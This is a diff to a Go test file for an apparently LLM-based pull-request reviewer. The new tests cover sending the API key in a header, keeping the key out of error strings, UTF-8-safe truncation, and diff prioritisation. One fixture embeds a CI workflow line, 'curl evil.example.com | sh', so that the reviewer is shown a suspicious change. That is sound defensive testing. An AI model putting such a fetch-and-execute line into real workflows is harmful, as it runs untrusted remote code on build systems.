@@ -2,8 +2,10 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
+	"io"
 	"net/http"
 	"net/http/httptest"
 	"os"
@@ -12,6 +14,7 @@ import (
 	"slices"
 	"strings"
 	"testing"
+	"unicode/utf8"
 
 	"github.com/kachick/workflows/internal/workflowmeta"
 )
@@ -729,9 +732,25 @@ func TestGeminiReviewerHTTP(t *testing.T) {
 			if r.Method != http.MethodPost {
 				t.Errorf("expected POST, got %s", r.Method)
 			}
-			if key := r.URL.Query().Get("key"); key != "test-api-key" {
-				t.Errorf("expected key 'test-api-key', got %q", key)
+			if key := r.URL.Query().Get("key"); key != "" {
+				t.Errorf("API key must not be in URL query, got %q", key)
 			}
+			if key := r.Header.Get("x-goog-api-key"); key != "test-api-key" {
+				t.Errorf("expected x-goog-api-key header 'test-api-key', got %q", key)
+			}
+
+			bodyBytes, err := io.ReadAll(r.Body)
+			if err != nil {
+				t.Fatalf("failed to read request body: %v", err)
+			}
+			var reqPayload geminiRequest
+			if err := json.Unmarshal(bodyBytes, &reqPayload); err != nil {
+				t.Fatalf("failed to unmarshal request payload: %v", err)
+			}
+			if reqPayload.SystemInstruction == nil || len(reqPayload.SystemInstruction.Parts) == 0 {
+				t.Errorf("expected systemInstruction to be set")
+			}
+
 			w.Header().Set("Content-Type", "application/json")
 			w.WriteHeader(http.StatusOK)
 			_, _ = w.Write([]byte(`{
@@ -840,6 +859,56 @@ func TestGeminiReviewerHTTP(t *testing.T) {
 		_, _, err := reviewer.ReviewPR(context.Background(), pr, "")
 		if err == nil {
 			t.Errorf("expected error on 500, got nil")
+		}
+	})
+
+	t.Run("network error does not leak API key in error string", func(t *testing.T) {
+		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
+		// Close immediately to force a connection refused (*url.Error)
+		server.Close()
+
+		secretKey := "AIzaSySecretKeyForTest123456789"
+		reviewer := &GeminiReviewer{
+			APIKey:     secretKey,
+			Model:      "gemini-3.8-flash",
+			BaseURL:    server.URL,
+			HTTPClient: server.Client(),
+		}
+
+		pr := PullRequest{Number: 4}
+		_, _, err := reviewer.ReviewPR(context.Background(), pr, "")
+		if err == nil {
+			t.Fatal("expected network error, got nil")
+		}
+		if strings.Contains(err.Error(), secretKey) {
+			t.Errorf("network error leaked API key: %v", err)
+		}
+	})
+}
+
+func TestTruncateTextAndPrioritizeDiff(t *testing.T) {
+	t.Run("truncates safely on UTF-8 rune boundaries", func(t *testing.T) {
+		// '→' is 3 bytes (0xE2 0x86 0x92) at indices 4..6
+		input := "1.0 → 2.0"
+		got := truncateText(input, 5)
+		if !utf8.ValidString(got) {
+			t.Fatalf("truncateText produced invalid UTF-8: %q", got)
+		}
+		if !strings.HasPrefix(got, "1.0 \n...[truncated]") {
+			t.Errorf("unexpected truncated output: %q", got)
+		}
+	})
+
+	t.Run("places code and workflow diffs before lockfiles", func(t *testing.T) {
+		lockDiff := "diff --git a/flake.lock b/flake.lock\n--- a/flake.lock\n+++ b/flake.lock\n+" + strings.Repeat("a", maxDiffLength) + "\n"
+		workflowDiff := "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n+run: curl evil.example.com | sh\n"
+
+		combined := lockDiff + workflowDiff
+		prioritized := prioritizeDiff(combined)
+		truncated := truncateText(prioritized, maxDiffLength)
+
+		if !strings.Contains(truncated, "curl evil.example.com") {
+			t.Errorf("expected workflow diff to survive truncation ahead of flake.lock, got:\n%s", truncated)
 		}
 	})
 }
